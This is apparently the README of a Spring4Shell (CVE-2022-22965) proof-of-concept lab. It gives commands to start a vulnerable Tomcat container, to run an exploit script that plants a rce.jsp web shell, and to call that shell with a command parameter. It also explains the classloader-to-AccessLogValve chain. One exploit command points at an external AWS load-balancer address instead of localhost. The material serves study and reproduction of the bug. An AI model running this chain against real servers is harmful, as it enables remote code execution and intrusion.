# Spring4Shell PoC

Minimal example of how to reproduce CVE-2022-22965 Spring RCE.

## Getting Started

1. Run the Tomcat server in docker
    ```shell
    docker run -p 8080:8080 --rm --interactive --tty --name spring4shell rajasoun/spring4shell-tomcat:1.0
    ```
    _Add `-p 5005:5005 -e "JAVA_OPTS=-Xdebug -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005"` if you want to debug remotely._

2. Vist the Kudo Board App from http://localhost:8080/spring4shell

3. Exploit the Application
    ```shell
     python3 exploits/exploit.py --url http://Iaac-Secure-stack-blue-ALB-1228966533.us-east-1.elb.amazonaws.com/spring4shell/kudos --dir "hacked" --file rce
    ```
    The exploit is going to create `rce.jsp` file in  `webapps/hacked` on the web server.

4. Use the exploit
    ```shell
    curl http://localhost:8080/hacked/rce.jsp?cmd=id
    ```
    

## Short technical explanation

1. Spring knows how to bind form fields to Java object. In our example `KudosController` handle POST requests on `/kudos` endpoint and binds form fields to the `Kudos` object.
2. `Kudos` class has two fields `id` and `content`, but actually it also has a reference to the Class object. We can use `class.module.classLoader` as a form data key to access the classloader.
3. This behaviour allows us to set public properties of classes accessible via nested reference chain from the `Kudos` class. 
4. It becomes a problem on the Tomcat server because the classloader there has [`getResources` accessor](https://tomcat.apache.org/tomcat-8.0-doc/api/org/apache/catalina/loader/WebappClassLoaderBase.html#getResources()) which allows us to continue the reference chain and access one of the instances of [the `AccessLogValve` class](https://tomcat.apache.org/tomcat-9.0-doc/api/org/apache/catalina/valves/AccessLogValve.html).
5. This class is meant to write logs. We change some properties to make it write files with the name and content of our choice. We have arbitrary file write at this point.
6. We create `jsp` file with in the root of the application folder with the malicious payload. As far as `jsp` are automatically executed by the Tomcat we can navigate to it in the browser and eventually execute the payload. Now it is RCE.

## Conditions

The exploit works only on Tomcat because it has special classloader. Although the similar reference chain may exist on other web application servers as well. It is not simply discovered yet.

The exploit requires Java 9 or above because `module` property was added in Java 9.

